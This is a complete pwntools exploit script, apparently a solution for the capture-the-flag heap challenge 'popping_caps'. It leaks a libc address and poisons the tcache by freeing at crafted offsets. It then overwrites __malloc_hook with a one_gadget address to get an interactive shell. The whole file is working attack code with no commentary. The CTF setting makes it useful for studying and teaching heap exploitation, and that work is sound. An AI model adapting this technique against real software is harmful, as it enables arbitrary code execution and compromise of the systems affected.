from pwn import *

libc = ELF('./libc.so.6')
context.arch = 'amd64'

def add(size):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(size))

def free(offset):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(offset))

def write(content):
	r.sendlineafter(':', '3')
	r.sendafter(':', content)

def bye():
	r.sendlineafter(':', '4')

def DEBUG():
	gdb.attach(r)

r = process('./popping_caps')

r.recvuntil('0x')
libc_base = int(r.recvn(12), 16) - libc.symbols['system']
print "libc_base @ ", hex(libc_base)
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print "malloc_hook @ ", hex(malloc_hook)

add(0x3a0)
free(0)
free(-0x210)
add(0xf0)
write(p64(malloc_hook))
add(0x10)
write(p64(one_shot))

r.interactive()